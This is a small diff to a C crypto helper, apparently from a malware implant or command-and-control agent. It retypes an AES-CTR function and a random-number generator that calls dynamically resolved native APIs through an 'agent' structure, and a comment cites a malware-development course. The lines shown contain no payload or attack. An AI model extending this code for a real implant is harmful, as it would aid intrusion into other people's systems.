@@ -1,7 +1,7 @@
 #include "Crypto.h"
 
 //TODO rewrite this to use AES encryption mechanism from maldev academy.
-INT AESCTR(BYTE* Buffer, ULONG BufferLength, BYTE* AESKey, UINT32 AesKeySize, BYTE* IV) {
+INT AESCTR(BYTE* Buffer, DWORD BufferLength, BYTE* AESKey, UINT32 AesKeySize, BYTE* IV) {
 	Aes aes;
 	int err;
 
@@ -21,8 +21,8 @@ INT AESCTR(BYTE* Buffer, ULONG BufferLength, BYTE* AESKey, UINT32 AesKeySize, BY
 	return 0;
 }
 
-ULONG GenerateRandomNumber() {
-	ULONG Seed = 0;
+DWORD GenerateRandomNumber() {
+	DWORD Seed = 0;
 	Seed = agent->apis->pNtGetTickCount();
 	Seed = agent->apis->pRtlRandomEx(&Seed);
 	Seed = agent->apis->pRtlRandomEx(&Seed);
